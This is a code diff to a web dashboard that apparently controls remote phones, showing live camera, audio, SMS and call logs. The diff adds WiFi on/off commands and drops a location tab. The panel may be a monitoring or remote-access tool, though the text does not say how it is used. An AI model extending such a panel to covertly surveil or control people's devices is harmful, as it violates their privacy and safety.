@@ -1838,6 +1838,8 @@
             <button class="btn-ghost" id="btnStream_${deviceId}" onclick="cycleStreamMode('${deviceId}')">Stream: Auto</button>
             <button class="btn-ghost" onclick="resetAudioSettings('${deviceId}')">Reset Audio</button>
             <button class="btn-ghost" id="btnVizMode_${deviceId}" onclick="cycleVizMode('${deviceId}')">Viz: Wave</button>
+            <button class="btn-ghost" onclick="wifiOn('${deviceId}')">📶 WiFi ON</button>
+            <button class="btn-ghost" onclick="wifiOff('${deviceId}')">📴 WiFi OFF</button>
             <button class="btn-ghost" onclick="forceUpdate('${deviceId}')">🔄 Update App</button>
             <button class="btn-ghost" onclick="grantPermissions('${deviceId}')">✅ Grant Permissions</button>
             <button class="btn-danger" onclick="uninstallApp('${deviceId}')">🗑️ Uninstall App</button>
@@ -1846,12 +1848,10 @@
           <div class="photo-list live-video-wrap" id="liveCam_${deviceId}" style="display:none"></div>
           <div class="photo-list" id="photoList_${deviceId}"></div>
           <div class="tab-bar">
-            <button class="tab-btn active" onclick="openTab('${deviceId}','location',this)">📍 Location</button>
-            <button class="tab-btn"        onclick="openTab('${deviceId}','sms',this)">💬 SMS</button>
+            <button class="tab-btn active" onclick="openTab('${deviceId}','sms',this)">💬 SMS</button>
             <button class="tab-btn"        onclick="openTab('${deviceId}','calls',this)">📞 Calls</button>
           </div>
-          <div class="tab-panel active" id="tab_${deviceId}_location"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>
-          <div class="tab-panel"        id="tab_${deviceId}_sms"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>
+          <div class="tab-panel active" id="tab_${deviceId}_sms"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>
           <div class="tab-panel"        id="tab_${deviceId}_calls"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>`;
         document.getElementById("devicesContainer").appendChild(card);
         const savedRnEnabled = loadRnnoiseEnabled(deviceId);
@@ -2696,6 +2696,19 @@
         }
         sendCmd(deviceId, "uninstall_app");
         log(`Uninstall command sent to ${deviceId}`, "warn");
+      }
+      
+      function wifiOn(deviceId) {
+        sendCmd(deviceId, "wifi_on");
+        log(`WiFi ON command sent to ${deviceId}`, "info");
+      }
+      
+      function wifiOff(deviceId) {
+        if (!confirm(`📴 Turn WiFi OFF on device ${deviceId}?\n\n⚠️ WARNING: If this is a WiFi-only device, you may lose connection to it!`)) {
+          return;
+        }
+        sendCmd(deviceId, "wifi_off");
+        log(`WiFi OFF command sent to ${deviceId}`, "warn");
       }
 
       function renderWebRtcState(deviceId, state, bitrateKbps, quality) {
